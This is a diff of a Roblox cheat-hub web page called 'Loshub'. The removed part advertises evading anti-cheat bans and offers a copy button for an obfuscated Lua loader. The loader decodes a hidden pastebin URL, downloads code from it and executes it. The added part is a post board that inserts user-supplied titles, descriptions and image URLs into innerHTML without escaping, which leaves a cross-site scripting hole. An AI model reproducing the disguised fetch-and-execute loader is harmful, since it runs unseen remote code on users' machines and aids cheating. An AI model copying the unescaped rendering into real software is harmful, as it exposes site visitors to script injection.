@@ -3,174 +3,103 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Welcome to Loshub</title>
+  <title>Roblox Loshub</title>
   <style>
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: radial-gradient(circle at top, #5a5aff, #2f2f5f);
+      background: radial-gradient(circle at top, #4a5dff, #1f2a40);
       color: #fff;
       text-align: center;
       overflow-x: hidden;
     }
-
-    main {
-      padding: 100px 20px 60px;
-      position: relative;
-      z-index: 2;
-    }
-
-    h2 {
-      font-size: 28px;
-      margin-bottom: 15px;
-      text-shadow: 0 0 10px rgba(255,255,255,0.5);
-    }
-
-    p {
-      font-size: 16px;
-      max-width: 500px;
-      margin: 0 auto 25px auto;
-    }
-
-    .download-btn {
-      display: inline-block;
-      background: rgba(150,140,255,0.8);
-      color: #fff;
-      padding: 12px 25px;
-      border-radius: 10px;
-      font-size: 16px;
-      text-decoration: none;
-      font-weight: bold;
-      transition: all 0.3s;
-      box-shadow: 0 0 15px rgba(150,140,255,0.6);
-      cursor: pointer;
-    }
-    .download-btn:hover {
-      background: rgba(200,190,255,0.9);
-      box-shadow: 0 0 25px rgba(200,190,255,0.8);
-      transform: scale(1.05);
-    }
-
-    .shape {
-      position: absolute;
-      width: 40px;
-      height: 40px;
-      background: rgba(255,255,255,0.08);
-      border-radius: 6px;
-      animation: floatXY 20s infinite ease-in-out alternate;
-      box-shadow: 0 0 10px rgba(255,255,255,0.1);
-    }
-    .shape:nth-child(1) { top: 20%; left: 10%; width: 50px; height: 50px; animation-duration: 28s; }
-    .shape:nth-child(2) { top: 60%; left: 70%; animation-duration: 30s; }
-    .shape:nth-child(3) { top: 80%; left: 40%; width: 45px; height: 45px; animation-duration: 26s; }
-    .shape:nth-child(4) { top: 10%; left: 80%; width: 60px; height: 60px; animation-duration: 35s; }
-    .shape:nth-child(5) { top: 50%; left: 20%; animation-duration: 32s; }
-
-    @keyframes floatXY {
-      0% { transform: translate(0,0) rotate(0deg); }
-      25% { transform: translate(20px,-15px) rotate(90deg); }
-      50% { transform: translate(-15px,20px) rotate(180deg); }
-      75% { transform: translate(25px,15px) rotate(270deg); }
-      100% { transform: translate(0,0) rotate(360deg); }
-    }
-
-    .how-to {
-      margin-top: 120px;
-    }
-
-    .how-to h3 {
-      font-size: 22px;
-      margin-bottom: 5px;
-      text-shadow: 0 0 8px rgba(255,255,255,0.4);
-    }
-
-    .subtitle {
-      font-size: 16px;
-      color: #aaa;
-      margin-top: -2px;
-      margin-bottom: 10px;
-    }
-
-    .key-input {
-      padding: 8px;
-      border-radius: 5px;
-      font-size: 14px;
-      width: 220px;
-    }
-
-    #generatedKey {
-      margin-top: 10px;
-      font-size: 16px;
-      font-weight: bold;
-    }
-
-    .create-key {
-      margin-top: 60px; /* Create Key 영역 더 아래로 */
-    }
+    main { padding: 50px 20px; }
+    h2 { font-size: 40px; text-shadow: 0 0 15px rgba(255,255,255,0.6); }
+    .download-btn { background: rgba(150,140,255,0.8); color: #fff; padding: 10px 20px; border-radius:10px; cursor:pointer; margin:5px; }
+    .download-btn:hover { background: rgba(200,190,255,0.9); }
+    #form { display:none; margin-top:20px; }
+    #posts div { border:1px solid #555; padding:10px; margin:10px; text-align:left; }
+    input { padding:5px; margin:5px; border-radius:5px; }
   </style>
 </head>
 <body>
-  <div class="shape"></div>
-  <div class="shape"></div>
-  <div class="shape"></div>
-  <div class="shape"></div>
-  <div class="shape"></div>
-
   <main>
-    <h2>Welcome to Loshub</h2>
-    <p>This hub can be used even in towers with all-kill anti-cheat without getting banned!</p>
+    <h2>Roblox Loshub</h2>
 
-    <button class="download-btn" onclick="copyScript()">Copy for script ⬇️</button>
+    <!-- 검색 + 새 포스트 -->
+    <input type="text" id="search" placeholder="Search posts...">
+    <button class="download-btn" onclick="searchPosts()">🔍</button>
+    <button class="download-btn" onclick="toggleForm()">➕</button>
 
-    <div class="how-to">
-      <h3>How To get key?</h3>
-      <p class="subtitle">
-        You can get the key from Los Discord / KakaoTalk, or you can also get it from this site.
-      </p>
-
-      <div class="create-key">
-        <h3>Create Key</h3>
-        <input type="text" id="username" placeholder="Enter your Roblox username" class="key-input">
-        <button class="download-btn" onclick="createKey()" style="margin-left:10px; font-size:14px; padding:8px 15px;">Generate Key</button>
-        <p id="generatedKey"></p>
-      </div>
+    <!-- 새 포스트 폼 -->
+    <div id="form">
+      <input type="text" id="title" placeholder="Post title (required)">
+      <input type="text" id="desc" placeholder="Description (required)">
+      <input type="text" id="thumb" placeholder="Thumbnail URL (optional)">
+      <button class="download-btn" onclick="createPost()">완료</button>
     </div>
+
+    <!-- 포스트 출력 영역 -->
+    <div id="posts"></div>
   </main>
 
   <script>
-    function copyScript() {
-      const script = `local x={HDD=loadstring,GHD=function(u)return game:HttpGet(u)end}
-local z="\\104\\116\\116\\112\\115\\58\\47\\47\\112\\97\\115\\116\\101\\98\\105\\110\\46\\99\\111\\109\\47\\114\\97\\119\\47\\116\\86\\82\\70\\77\\112\\76\\87"
-local function w(s)local t={}for i=1,#s do t[#t+1]=string.char(s:byte(i))end return table.concat(t)end
-local c=x.GHD(w(z))
-x["HDD"](c)()`;
-      
-      const textarea = document.createElement("textarea");
-      textarea.value = script;
-      document.body.appendChild(textarea);
-      textarea.select();
-      document.execCommand("copy");
-      document.body.removeChild(textarea);
+    const API = ""; // Render 서버 URL 입력, 예: "https://your-app.onrender.com"
 
-      alert("Script copied to clipboard!");
+    function toggleForm() {
+      const f = document.getElementById("form");
+      f.style.display = f.style.display === "none" ? "block" : "none";
     }
 
-    function createKey() {
-      const username = document.getElementById("username").value.trim();
-      if(!username) {
-        alert("Please enter your username.");
-        return;
-      }
+    async function createPost() {
+      const title = document.getElementById("title").value;
+      const description = document.getElementById("desc").value;
+      const thumbnail = document.getElementById("thumb").value;
 
-      const nameLength = username.length;
-      const digits = username.match(/\d/g) || [];
-      const digitSum = digits.reduce((sum, d) => sum + parseInt(d), 0);
-      const keyBase = nameLength + digitSum;
-      const secondChar = username[1] || "";
-      const finalKey = secondChar + keyBase;
+      if(!title || !description) { alert("제목과 설명 필수!"); return; }
 
-      document.getElementById("generatedKey").innerText = "Your Key: " + finalKey;
+      const res = await fetch(`${API}/posts`, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({title, description, thumbnail})
+      });
+      const data = await res.json();
+      alert("✅ Post created!");
+      loadPosts();
+      document.getElementById("title").value = "";
+      document.getElementById("desc").value = "";
+      document.getElementById("thumb").value = "";
+      toggleForm();
     }
+
+    async function loadPosts() {
+      const res = await fetch(`${API}/posts`);
+      const posts = await res.json();
+      const container = document.getElementById("posts");
+      container.innerHTML = posts.map(p => `
+        <div>
+          <h3>${p.title}</h3>
+          <p>${p.description}</p>
+          ${p.thumbnail ? `<img src="${p.thumbnail}" width="100">` : ""}
+        </div>
+      `).join("");
+    }
+
+    async function searchPosts() {
+      const q = document.getElementById("search").value;
+      const res = await fetch(`${API}/posts/search?q=${q}`);
+      const posts = await res.json();
+      const container = document.getElementById("posts");
+      container.innerHTML = posts.map(p => `
+        <div>
+          <h3>${p.title}</h3>
+          <p>${p.description}</p>
+          ${p.thumbnail ? `<img src="${p.thumbnail}" width="100">` : ""}
+        </div>
+      `).join("");
+    }
+
+    loadPosts();
   </script>
 </body>
 </html>
